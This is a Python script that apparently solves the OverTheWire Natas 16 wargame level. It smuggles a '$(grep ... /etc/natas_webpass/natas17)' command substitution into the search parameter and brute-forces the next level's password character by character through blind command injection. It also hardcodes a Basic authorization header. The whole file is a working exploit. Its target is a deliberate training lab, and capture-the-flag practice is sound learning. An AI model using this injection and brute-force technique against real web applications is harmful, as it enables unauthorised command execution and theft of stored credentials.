import requests
import re

def send_req(value):
    data = f'$(grep -E ^{value}.*  /etc/natas_webpass/natas17)hacker'

    reqUrl = f"http://natas16.natas.labs.overthewire.org/?needle={data}&submit=Search"

    headersList = {
    "Accept": "*/*",
    "User-Agent": "Thunder Client (https://www.thunderclient.com)",
    "Authorization": "Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==",
    "Content-Type": "multipart/form-data; boundary=kljmyvW1ndjXaOEAg4vPm6RBUqO6MC5A" 
    }


    response = requests.get( reqUrl,  headers=headersList)

    return response.text


def valid(res):
    res = res.split('</pre>')[0]
    res = res.split('<pre>')[1].strip()

    if len(res)==0:
        return True
    return False

def main():

    password = ""

    attack_list_caps = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    attack_list_small = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    attack_list_digits = ['1','2','3','4','5','6','7','8','9','0']


    while len(password)<32:
        found = False

        res_caps = send_req(f"{password}[A-Z]")
        if valid(res_caps):
            attack_list = attack_list_caps
            print("Caps",end=" ")
        else:
            res_small = send_req(f"{password}[a-z]")
            if valid(res_small):
                attack_list = attack_list_small
                print("Small",end=" ")

            else:
                res_digit = send_req(f"{password}[0-9]")
                if valid(res_digit):
                    attack_list = attack_list_digits
                    print("Digit",end=" ")


        for ch in attack_list:
            print(password+ch,end=" ")
            res = send_req(password+ch)

            if valid(res):
                password += ch
                found = True
                break

        print('\n')

        if found:
            print("password: ",password)
        else:
            print("Stopped since no match found")
            break

    print("Final password: ",password)


        

main()